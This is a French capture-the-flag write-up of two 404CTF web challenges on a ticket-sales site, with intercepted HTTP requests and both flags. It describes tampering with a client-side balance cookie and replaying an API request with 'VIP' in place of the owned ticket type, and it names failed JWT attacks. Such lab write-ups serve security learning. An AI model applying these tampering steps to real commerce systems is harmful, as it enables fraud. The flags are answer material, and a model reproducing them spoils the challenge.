# Le match du siècle [1/2]
## Enoncé
> Vous voilà à quelques semaines du match tant attendu entre le Gorfou FC et l'AS Sealion.
> Seulement, vous vous êtes pris au dernier moment pour acheter votre place. Trouvez un moyen d'obtenir un billet !

Auteur: **@callister**
 
Connexion: `https://le-match-du-siecle.challenges.404ctf.fr`

## Analyse

Il s'agit d'un site de vente de billets dans lequel on peut s'inscrire.

Une fois inscrit on observe qu'un solde est associé à notre compte, de plus sont disponibles à la vente 5 Tribunes, dont la VIP dont les ventes sont épuisées.

<p align="center">
    <img src="../../Platforms/images/404CTFWeb2.png" alt="img1" style="width:40%;">
</p>

On peut intercepter la requête partante lors de la tentative d'achat d'un billet:
```http
POST /api/verification HTTP/2
Host: le-match-du-siecle.challenges.404ctf.fr
Cookie: token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlpvcnAxX19fXyIsImJpbGxldHMiOnsiVklQIjowLCJMYXRlcmFsZSI6MCwiRmFtaWxpYWxlIjowLCJFc3QiOjAsIk91ZXN0IjowLCJOb3JkIGV0IFN1ZCI6MH0sImlhdCI6MTcxNDU1NTMyMn0.C5NoOlKy_nyvZ1ivzZdCOIuip8NDAN_qvqqKVY2MK79_IndlMFHQSGS2kVHjJg-8O1jZcvpf4PGW698ipXDY27yfvvNADdb1srf8w2ib2MTRT-OgfRte6zPQo5qj8_VxmnSjC6Y6tGF1jbvWcPJ8uIY462w7dEr_BrYZHssd9-qbWqHI1XF713aVIWI_5OGcu-1RyRxOdgbVmq_cW73G_kyS4f9c-3uzca69ZWrZB8LpEgiIkShB-ADk8a7qbmT0c14ybVV7B6wvlsmqXJNHMp2wqRtD7uL-YLcHFjzNFUHiUDYXPvHNqWVqJQ9zrWWe9kDvTT6zNzQaK3w-_zh_ZQ; balance=0
...
Priority: u=1, i

{"token":"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlpvcnAxX19fXyIsImJpbGxldHMiOnsiVklQIjowLCJMYXRlcmFsZSI6MCwiRmFtaWxpYWxlIjowLCJFc3QiOjAsIk91ZXN0IjowLCJOb3JkIGV0IFN1ZCI6MH0sImlhdCI6MTcxNDU1NTMyMn0.C5NoOlKy_nyvZ1ivzZdCOIuip8NDAN_qvqqKVY2MK79_IndlMFHQSGS2kVHjJg-8O1jZcvpf4PGW698ipXDY27yfvvNADdb1srf8w2ib2MTRT-OgfRte6zPQo5qj8_VxmnSjC6Y6tGF1jbvWcPJ8uIY462w7dEr_BrYZHssd9-qbWqHI1XF713aVIWI_5OGcu-1RyRxOdgbVmq_cW73G_kyS4f9c-3uzca69ZWrZB8LpEgiIkShB-ADk8a7qbmT0c14ybVV7B6wvlsmqXJNHMp2wqRtD7uL-YLcHFjzNFUHiUDYXPvHNqWVqJQ9zrWWe9kDvTT6zNzQaK3w-_zh_ZQ"}
```
On remarque un JWT dans le cookie `token` qui est aussi présent dans les données de la requête POST, et également un paramètre `balance` à 0.

Balance nous fait fortement penser à notre solde et avant toute chose on peut tenter de modifier sa valeur à l'interception de la requête, et BINGO, notre requête est acceptée.

Si l'on retourne sur le site on peut voir que l'on a un ticket en plus dans notre inventaire mais également la différence du prix du billet et de la somme qu'on a rentrée en paramètre.

En ouvrant le billet on remarque une image contenant le flag que nous recherchions (on peut utiliser https://www.onlineocr.net/ pour utilisier de l'OCR sur ce flag, et ne pas perdre une éternité à le recopier avec des fautes;) ).

Flag: **404CTF{b5a77ed0fa6968b21df7fb137437fae1} **

# Le match du siècle [2/2]
## Enoncé
> Vous avez déjà en votre possession un billet, néanmoins, pour impressionner votre famille, vous souhaiteriez des places VIP.

Auteur: **@callister**
 
Connexion: `https://le-match-du-siecle.challenges.404ctf.fr`

## Analyse

Pour celà on peut observer le JWT qui a changé, et on y observe les informations suivantes:
**Header**
```
{
  "alg": "HS256",
  "typ": "JWT"
}
```
**Payload**
```
{
  "username": "Zorp1____",
  "billets": {
    "VIP": 0,
    "Laterale": 1,
    "Familiale": 0,
    "Est": 0,
    "Ouest": 0,
    "Nord et Sud": 0
  },
  "iat": 1714555617
}
```
On comprend vite que si on voulait directement une place VIP sans la payer, on pourrait potentiellement modifier la valeur de ce JWT, et attribuer à 1 notre solde de tickets VIP. 
Seulement, on ne sait pas quel secret a été utilisé pour signer ce token et en fournissant une mauvaise signature on obtient un message d'erreur **ACCESS INTERDIT AUX HACKERS**. 
Des attaques classiques comme le None algorithm ou un brute force sur la clé (en utilisant le dictionnaire rockyou) n'ont pas marché alors j'ai continué à observer.

Lorsque l'on ouvre le billet de la tribune qu'on a acheté précedemment, on observe ceci:
```http
POST /api/riche HTTP/2
Host: le-match-du-siecle.challenges.404ctf.fr
Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlpvcnAxX19fXyIsImJpbGxldHMiOnsiVklQIjowLCJMYXRlcmFsZSI6MSwiRmFtaWxpYWxlIjowLCJFc3QiOjAsIk91ZXN0IjowLCJOb3JkIGV0IFN1ZCI6MH0sImlhdCI6MTcxNDU1NTYxN30.DVHnxb3mPW4rYu48tSBpGdF-O-btNu_GXAs0uBN9Db0; balance=10
...
Priority: u=1, i

{"token":"Laterale"}
```
Il semblerait que l'identifier de notre billet soit écrit en clair dans la requête POST envoyée à l'API.

## Exploitation

En reproduisant cette requête mais en changeant les données par `{"token":"VIP"}`, une image nous est renvoyée et elle contient un flag différent.

Flag: **404CTF{b7554ee60d0020216749d428830a5511}**